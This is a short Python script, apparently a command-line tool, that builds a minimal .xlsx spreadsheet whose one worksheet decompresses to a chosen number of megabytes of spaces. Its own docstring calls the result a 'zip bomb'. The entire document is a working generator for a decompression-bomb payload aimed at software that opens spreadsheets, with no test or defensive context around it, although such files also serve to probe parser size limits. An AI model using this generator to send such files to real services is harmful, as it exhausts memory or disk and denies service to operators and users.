#!/usr/bin/env python3
"""A small .xlsx whose one sheet inflates to SIZE_MB of spaces (a 'zip bomb')."""
import sys, zipfile, zlib, io
out, size_mb = sys.argv[1], int(sys.argv[2])
sheet = b'<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>' + b' ' * (size_mb << 20) + b'</sheetData></worksheet>'
files = {
 "[Content_Types].xml": b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>',
 "_rels/.rels": b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>',
 "xl/workbook.xml": b'<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>',
 "xl/_rels/workbook.xml.rels": b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>',
 "xl/worksheets/sheet1.xml": sheet,
}
with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
    for n, d in files.items():
        z.writestr(n, d)
import os
print(out, os.path.getsize(out), "bytes ->", len(sheet) >> 20, "MB sheet")
